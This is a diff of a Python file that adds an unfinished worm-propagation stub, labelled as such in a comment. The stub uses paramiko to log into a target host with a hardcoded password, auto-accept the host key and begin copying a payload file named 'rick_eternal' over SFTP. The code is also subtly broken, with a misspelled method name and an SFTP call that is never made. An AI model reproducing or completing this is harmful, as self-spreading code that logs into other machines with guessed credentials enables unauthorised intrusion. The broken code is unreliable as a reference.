@@ -1,3 +1,24 @@
-import subprocess
-p = subprocess.Popen(["scp", "the file.txt", "username@server:path")]
-sts = os.waitpid(p.pid,0)
+
+
+
+#--Potential SSH/SCP for worm
+import paramiko
+from sys import argv
+
+PAYLOAD = "~/rick_eternal"
+
+ipaddr = argv[1]
+user_name = argv[2]
+passwd = 'academy'
+
+#ssh client
+client = paramiko.SSHClient()
+client.set_missing_host_key_police(paramiko.AutoAddPolicy())
+client.connect(ipaddr, username=user_name, password=passwd, key_filename='~/ssh/id_rsa.pem')
+print(f"Connecting to {ipaddr} as user '{user_name}' with password '{passwd}'")
+
+#secure file transfer protocol
+sftp = client.open_sftp
+
+#client.exec_command('') For playing win media player mp4 
+
